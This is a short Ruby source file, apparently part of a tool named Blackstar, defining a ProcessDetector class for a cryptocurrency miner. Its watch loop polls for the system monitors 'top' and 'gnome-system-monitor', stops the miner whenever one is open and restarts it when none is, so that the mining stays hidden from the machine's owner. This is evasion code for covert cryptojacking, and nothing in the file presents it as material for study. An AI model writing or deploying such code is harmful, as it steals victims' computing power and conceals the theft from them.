module Blackstar
  class ProcessDetector
    MONITORS = %w(top gnome-system-monitor)
    attr_reader :miner

    def initialize(miner)
      @miner = miner
    end

    def watch
      loop do
        detected = detect
        if detected
          p "Detected #{detected}"
          if miner.miner_started
            miner.kill_process
          end
        else
          unless miner.miner_started
            miner.start_mine
          end
        end
        yield

        sleep 0.5
      end
    end

    def detect
      MONITORS.each do |monitor|
        pid = Cmd.call("pgrep #{monitor}")
        if pid != ''
          return monitor
        end
      end
      false
    end
  end
end